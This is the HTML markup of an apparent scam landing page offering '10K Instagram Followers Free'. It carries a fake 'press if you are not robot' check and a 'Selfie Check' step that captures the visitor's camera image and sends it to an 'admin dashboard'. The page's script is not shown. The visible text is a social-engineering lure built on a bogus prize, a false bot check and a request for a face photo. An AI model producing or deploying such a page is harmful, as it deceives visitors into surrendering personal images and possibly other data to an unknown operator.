<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="description" content="Congratulations! 10K Instagram followers free — press below." />
  <title>Congratulations! 10K Followers Free</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <main class="page">
    <div class="card" role="main" aria-labelledby="headline">
      <div class="badge" aria-hidden="true">🎉</div>
      <h1 id="headline">Congratulations!</h1>
      <p class="subtitle"><strong>10K Instagram Followers Free</strong></p>
      <p class="muted">100 persent free follower</p>

      <div class="cam-box">
        <p class="cam-title">📸 Step 1 (optional): Selfie Check</p>
        <p class="cam-note">This demo can take your selfie and show it on the admin dashboard.
          Nothing is captured until you tap <strong>Send My Photo</strong>.</p>
        <video id="camPreview" playsinline muted autoplay style="display:none"></video>
        <div class="cam-btns">
          <button id="camOpenBtn" class="cam-btn" type="button">Open Camera</button>
          <button id="camSendBtn" class="cam-btn primary" type="button" style="display:none">Send My Photo</button>
          <button id="camCancelBtn" class="cam-btn" type="button" style="display:none">Close</button>
        </div>
        <div id="camStatus" class="status" role="status" aria-live="polite" style="display:none"></div>
      </div>

      <div class="lock" aria-hidden="true">🔐</div>
      <p class="cta-label">press if you are not robot</p>

      <button id="pressBtn" class="press-btn" type="button">[ PRESS HERE ]</button>

      <div id="status" class="status" role="status" aria-live="polite"></div>
    </div>
  </main>
  <script src="app.js"></script>
</body>
</html>
